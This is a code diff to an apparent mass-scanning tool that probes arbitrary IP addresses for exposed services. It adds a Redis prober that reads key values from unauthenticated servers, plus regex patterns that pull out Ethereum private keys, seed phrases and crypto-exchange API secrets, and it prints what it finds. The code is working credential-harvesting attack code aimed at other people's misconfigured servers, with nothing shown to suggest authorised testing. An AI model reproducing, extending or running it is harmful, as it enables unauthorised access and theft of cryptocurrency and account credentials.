@@ -23,6 +23,9 @@ KEY_RE = re.compile(
     r'|AIza[0-9A-Za-z\-_]{35}'                                    # Google API key
     r'|[0-9]{9,10}:[A-Za-z0-9_\-]{35}'                           # Telegram bot token
     r'|(?:AWS_SECRET|aws_secret_access_key)\s*[=:]\s*[^\s"\']{20,}'
+    r'|(?:private.?key|eth.?key|wallet.?key|mnemonic|seed.?phrase)\s*[=:"\s]+([0-9a-fA-F]{64})'  # ETH privkey
+    r'|(?:0x[0-9a-fA-F]{64})'                                    # ETH privkey with 0x
+    r'|(?:binance|bnb|bybit|okx|kraken|coinbase).{0,30}(?:secret|api.?secret)\s*[=:"\s]+([A-Za-z0-9]{32,})'  # exchange secrets
     r'|(?:password|passwd|secret|token|api.?key|private.?key|access.?key)\s*[=:]\s*["\']?([^\s"\'<>]{8,50}))',
     re.IGNORECASE
 )
@@ -232,12 +235,60 @@ def probe_elastic(ip):
     except:
         return None
 
+def probe_redis(ip):
+    try:
+        import socket
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(TIMEOUT)
+        s.connect((ip, 6379))
+
+        def cmd(*args):
+            c = f'*{len(args)}\r\n' + ''.join(f'${len(str(a))}\r\n{a}\r\n' for a in args)
+            s.send(c.encode())
+            return s.recv(65536).decode('utf-8', errors='replace')
+
+        pong = cmd('PING')
+        if 'PONG' not in pong and 'NOAUTH' not in pong:
+            s.close()
+            return None
+
+        if 'NOAUTH' in pong:
+            s.close()
+            return None  # auth required
+
+        # Scan keys
+        keys_resp = cmd('SCAN', '0', 'COUNT', '200')
+        keys = [k for k in keys_resp.split('\r\n') if k and not k.startswith(('*', '$', ':'))]
+
+        secrets = []
+        for key in keys[:100]:
+            try:
+                val = cmd('GET', key)
+                text = f'{key}={val}'
+                found = find_secrets(text)
+                if found:
+                    secrets.extend(found[:5])
+                    print(f'  REDIS SECRET: {ip} key={key[:40]}', flush=True)
+                    for sec in found[:2]:
+                        print(f'    -> {sec[:80]}', flush=True)
+            except:
+                pass
+
+        s.close()
+        result = {'ip': ip, 'port': 6379, 'type': 'redis', 'keys': len(keys), 'secrets': secrets}
+        print(f'  REDIS: {ip} keys={len(keys)} secrets={len(secrets)}', flush=True)
+        return result if secrets or len(keys) > 0 else None
+    except:
+        return None
+
+
 PROBERS = {
     8888: probe_jupyter,
     27017: probe_mongo,
     8545: probe_eth,
     2375: probe_docker,
     9200: probe_elastic,
+    6379: probe_redis,
 }
 
 candidates = []
